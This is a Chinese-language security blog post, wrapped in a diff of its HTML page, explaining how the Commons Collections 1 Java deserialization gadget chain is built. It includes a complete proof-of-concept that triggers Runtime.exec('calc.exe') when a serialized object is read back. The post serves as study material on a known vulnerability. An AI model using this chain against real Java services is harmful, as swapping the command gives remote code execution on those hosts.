@@ -1,0 +1,419 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>【Java反序列化】CommonCollections1利用链 | Limpid</title>
+<link rel="shortcut icon" href="https://limpid94.github.io/favicon.ico?v=1645002667970">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://limpid94.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="【Java反序列化】CommonCollections1利用链 | Limpid - Atom Feed" href="https://limpid94.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="基础
+Transformer
+其为接口，只有一个transform接口，后续若被继承则需实现该接口。
+ConstantTransformer
+该类继承了Transformer接口，并在transform方法中返回了由构造方法传入的类。
+pu..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://limpid94.github.io">
+  <img class="avatar" src="https://limpid94.github.io/images/avatar.png?v=1645002667970" alt="">
+  </a>
+  <h1 class="site-title">
+    Limpid
+  </h1>
+  <p class="site-description">
+    Keep thinking , keeping learning
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              【Java反序列化】CommonCollections1利用链
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-02-11
+              </span>
+              <span>
+                8 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <h2 id="基础">基础</h2>
+<h3 id="transformer">Transformer</h3>
+<p>其为接口，只有一个<code>transform</code>接口，后续若被继承则需实现该接口。</p>
+<h3 id="constanttransformer">ConstantTransformer</h3>
+<p>该类继承了Transformer接口，并在<code>transform</code>方法中返回了由构造方法传入的类。</p>
+<pre><code class="language-java">public ConstantTransformer(Object constantToReturn) {
+        this.iConstant = constantToReturn;
+    }
+
+public Object transform(Object input) {
+    return this.iConstant;
+}
+</code></pre>
+<h3 id="invokertransformer">InvokerTransformer</h3>
+<p>在<code>transform</code>中利用反射调用传入某个类的方法，而调用的方法和所需的参数则在构造函数中完成赋值。最终完成该方法的执行结果。</p>
+<h3 id="chainedtransformer">ChainedTransformer</h3>
+<p>该类通过循环的方式调用传入的transformers数组的transform方法，并将上一次的循环结果带入下一个循环中。</p>
+<h2 id="commonscollections1利用链的构造">CommonsCollections1利用链的构造</h2>
+<p>首先最关键的是危险方法的调用。在JAVA中执行系统命令的都是Runtime类，但是Runtime类没有继承Serializable类，无法进行 序列化操作。于是需要被反射调用。</p>
+<h3 id="构造过程">构造过程</h3>
+<p>首先看到InvokerTransformer，其transform方法代码如下</p>
+<pre><code class="language-java"> public Object transform(Object input) {
+        if (input == null) {
+            return null;
+        }
+        try {
+            Class cls = input.getClass();
+            Method method = cls.getMethod(iMethodName, iParamTypes);
+            return method.invoke(input, iArgs);
+                
+        } catch (NoSuchMethodException ex) {
+            throw new FunctorException(&quot;InvokerTransformer: The method '&quot; + iMethodName + &quot;' on '&quot; + input.getClass() + &quot;' does not exist&quot;);
+        } catch (IllegalAccessException ex) {
+            throw new FunctorException(&quot;InvokerTransformer: The method '&quot; + iMethodName + &quot;' on '&quot; + input.getClass() + &quot;' cannot be accessed&quot;);
+        } catch (InvocationTargetException ex) {
+            throw new FunctorException(&quot;InvokerTransformer: The method '&quot; + iMethodName + &quot;' on '&quot; + input.getClass() + &quot;' threw an exception&quot;, ex);
+        }
+</code></pre>
+<p>其主要的作用就是反射调用传入的方法，于是可以利用其调用Runtime达到命令执行的效果。（此处先不论Runtime无法序列化的问题）。</p>
+<pre><code class="language-java">package cc.commonscollections.test;
+
+import org.apache.commons.collections.functors.InvokerTransformer;
+
+public class Test {
+    public static void main(String[] args) {
+
+        Runtime r = Runtime.getRuntime();
+        new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;calc.exe&quot;}).transform(r);
+    }
+}
+</code></pre>
+<p>然后查找哪里调用了该类的transform或者有同名方法的类：<br>
+<img src="https://limpid94.github.io/post-images/1644741115597.PNG" alt="" loading="lazy"><br>
+其中 org/apache/commons/collections/map/TransformedMap.java中的checkSetValue调用了关键方法：</p>
+<pre><code class="language-java">    protected Object checkSetValue(Object value) {
+        return valueTransformer.transform(value);
+    }
+</code></pre>
+<p>继续查找哪里调用了checkSetValue，其中一个结果是org/apache/commons/collections/map/AbstractInputCheckedMapDecorator.java的setValue</p>
+<pre><code class="language-java">        public Object setValue(Object value) {
+            value = parent.checkSetValue(value);
+            return entry.setValue(value);
+        }
+</code></pre>
+<p>此处的setValue是属于AbstractInputCheckedMapDecorator类的静态类MapEntry：</p>
+<pre><code class="language-java">static class MapEntry extends AbstractMapEntryDecorator {
+
+        /** The parent map */
+        private final AbstractInputCheckedMapDecorator parent;
+
+        protected MapEntry(Map.Entry entry, AbstractInputCheckedMapDecorator parent) {
+            super(entry);
+            this.parent = parent;
+        }
+
+        public Object setValue(Object value) {
+            value = parent.checkSetValue(value);
+            return entry.setValue(value);
+        }
+    }
+</code></pre>
+<p>到此处需要理解一下TransformedMap是怎么调用到 AbstractInputCheckedMapDecorator的MapEntry的setValue。</p>
+<p>从代码得知，<code>TransformedMap</code>的<code>decorate</code>创建的该类的实例，并将<code>decorate</code>方法的参数<code>map</code>作为调用父类<code>AbstractInputCheckedMapDecorator</code>的构造函数时所传入的参数，并将<code>decorate</code>方法的第三个参数<code>valueTransformer</code>作为<code>this.valueTransformer</code>变量<br>
+于是需要有个Map.Entry的循环调用来进行触发：</p>
+<pre><code class="language-java">Runtime r = Runtime.getRuntime();
+InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;calc.exe&quot;});
+
+HashMap&lt;Object,Object&gt; hashMap = new HashMap&lt;&gt;();
+hashMap.put(&quot;123&quot;,&quot;456&quot;);
+
+Map transformedMap = TransformedMap.decorate(hashMap,null, invokerTransformer);
+for(Map.Entry entry:transformedMap.entrySet()){
+     entry.setValue(r);
+ }
+</code></pre>
+<p><img src="https://limpid94.github.io/post-images/1644856931555.PNG" alt="" loading="lazy"><br>
+目前已经完成一半，接下来继续查找何处有类似的循环并且调用了setValue。<br>
+在<code>AnnotationInvocationHandler</code>中的<code>readObject</code>有类似的调用：</p>
+<pre><code class="language-java">    private void readObject(java.io.ObjectInputStream s)
+        throws java.io.IOException, ClassNotFoundException {
+        s.defaultReadObject();
+
+        // Check to make sure that types have not evolved incompatibly
+
+        AnnotationType annotationType = null;
+        try {
+            annotationType = AnnotationType.getInstance(type);
+        } catch(IllegalArgumentException e) {
+            // Class is no longer an annotation type; time to punch out
+            throw new java.io.InvalidObjectException(&quot;Non-annotation type in annotation serial stream&quot;);
+        }
+</code></pre>
+<p>但是这个类不是public的，无法直接调用，需要用反射直接加载<br>
+<img src="https://limpid94.github.io/post-images/1644993923128.PNG" alt="" loading="lazy"></p>
+<pre><code class="language-java">Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
+</code></pre>
+<p>然后根据类来实例化构造函数</p>
+<pre><code class="language-java">Constructor constructor =  c.getDeclaredConstructor(Class.class, Map.class);
+constructor.setAccessible(true);
+InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Target.class,transformedMap);
+</code></pre>
+<p>值得注意的是，此处的Target注解是因为注解中含有一个ElementType的值</p>
+<pre><code class="language-java">public @interface Target {
+    /**
+     * Returns an array of the kinds of elements an annotation type
+     * can be applied to.
+     * @return an array of the kinds of elements an annotation type
+     * can be applied to
+     */
+    ElementType[] value();
+}
+</code></pre>
+<p>这样在AnnotationInvocationHandler的readObject中才能顺利通过<code>if (memberType != null)</code> 进而执行到<code>memberValue.setValue()</code>。<br>
+<img src="https://limpid94.github.io/post-images/1644997316542.PNG" alt="" loading="lazy"><br>
+若换成<code>Overwirte</code>注解则会失败，原因在于其没有任何值。<br>
+<img src="https://limpid94.github.io/post-images/1644998716000.PNG" alt="" loading="lazy"><br>
+当然到此处依然还没结束，因为Runtime不能被序列化的问题还没解决。</p>
+<h3 id="构造可以被序列化的runtime类">构造可以被序列化的Runtime类</h3>
+<p>在Java中利用反射调有以下三种方式<br>
+1、类名.class</p>
+<pre><code class="language-java">    Runtime.class
+</code></pre>
+<p>2、实例名.getClass</p>
+<pre><code class="language-java">    Runtime runtime = new Runtime();
+    runtime.getClass;
+</code></pre>
+<p>3、通过类的完整路径获取</p>
+<pre><code class="language-java">    Class.forName(&quot;.......&quot;);
+</code></pre>
+<p>第二种显然没办法将Runtime进行序列化，但是第一种实际上是生成一个Class类，而Class类是可以被序列化的<br>
+<img src="https://limpid94.github.io/post-images/1644999039435.PNG" alt="" loading="lazy"><br>
+于是这里使用ConstantTransformer+InvokerTransformer来组成反射调用的链：</p>
+<pre><code class="language-java">        //相当于Runtime.getRuntime().exec(&quot;calc&quot;);
+        Transformer[] transformer = new Transformer[]{
+                //用反射的方法调用Runtime对象
+                new ConstantTransformer(Runtime.class),
+                //用反射中的getMethod方法来获取Method对象
+                new InvokerTransformer(&quot;getMethod&quot;,new Class[]{String.class,Class[].class}, new Object[]{&quot;getRuntime&quot;,null}),
+                //用invoke执行getRuntime
+                new InvokerTransformer(&quot;invoke&quot;,new Class[]{Object.class,Object[].class}, new Object[]{null,null}),
+                //调用exec方法并传入要执行的命令
+                new InvokerTransformer(&quot;exec&quot;,
+                        new Class[]{String.class},
+                        new Object[]{&quot;calc.exe&quot;}
+                        )
+        };
+</code></pre>
+<p>然后使用ChainedTransformer将上述链串起来，并方便TransformedMap.decorate调用。<br>
+##完整调用</p>
+<pre><code class="language-java">package cc.commonscollections;
+
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.TransformedMap;
+
+import java.io.*;
+//import java.lang.annotation.Target;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.InvocationTargetException;
+import java.util.HashMap;
+import java.util.Map;
+
+public class CommonCollections1Demo {
+    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException {
+        Transformer[] transformer = new Transformer[]{
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;,new Class[]{String.class,Class[].class}, new Object[]{&quot;getRuntime&quot;,null}),
+                new InvokerTransformer(&quot;invoke&quot;,new Class[]{Object.class,Object[].class}, new Object[]{null,null}),
+                new InvokerTransformer(&quot;exec&quot;,
+                        new Class[]{String.class},
+                        new Object[]{&quot;calc.exe&quot;}
+                        )
+        };
+
+        Transformer ctf = new ChainedTransformer(transformer);
+        Map map1 = new HashMap();
+        map1.put(&quot;value&quot;,&quot;123&quot;);
+        Map map2 = TransformedMap.decorate(map1,null,ctf);
+
+        Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
+        //获取构造函数
+        Constructor constructor = c.getDeclaredConstructor(Class.class, Map.class);
+        constructor.setAccessible(true);
+        InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Target.class,map2);
+//        mySeriable(invocationHandler);
+        myDeseriable();
+
+    }
+
+    public static void mySeriable(Object obj) throws IOException {
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
+        oos.writeObject(obj);
+    }
+
+    public static Object myDeseriable() throws IOException, ClassNotFoundException {
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;));
+        return ois.readObject();
+    }
+}
+
+</code></pre>
+<h2 id="参考材料">参考材料</h2>
+<p>[1] http://drops.xmd5.com/static/drops/papers-13244.html<br>
+[2] https://zhuanlan.zhihu.com/p/350058223<br>
+[3] https://www.freebuf.com/articles/web/312175.html<br>
+[4] http://121.40.251.109/2021/07/16/2021-7-16-ysoserial%E7%B3%BB%E5%88%97-CommonsCollections1%E9%93%BE%E5%88%86%E6%9E%90/</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#%E5%9F%BA%E7%A1%80">基础</a>
+<ul>
+<li><a href="#transformer">Transformer</a></li>
+<li><a href="#constanttransformer">ConstantTransformer</a></li>
+<li><a href="#invokertransformer">InvokerTransformer</a></li>
+<li><a href="#chainedtransformer">ChainedTransformer</a></li>
+</ul>
+</li>
+<li><a href="#commonscollections1%E5%88%A9%E7%94%A8%E9%93%BE%E7%9A%84%E6%9E%84%E9%80%A0">CommonsCollections1利用链的构造</a>
+<ul>
+<li><a href="#%E6%9E%84%E9%80%A0%E8%BF%87%E7%A8%8B">构造过程</a></li>
+<li><a href="#%E6%9E%84%E9%80%A0%E5%8F%AF%E4%BB%A5%E8%A2%AB%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84runtime%E7%B1%BB">构造可以被序列化的Runtime类</a></li>
+</ul>
+</li>
+<li><a href="#%E5%8F%82%E8%80%83%E6%9D%90%E6%96%99">参考材料</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://limpid94.github.io/post/java-fan-xu-lie-hua-dui-urldns-de-xue-xi/">
+              <h3 class="post-title">
+                【JAVA反序列化】URLDNS利用链
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by Limpid .
+  <a class="rss" href="https://limpid94.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
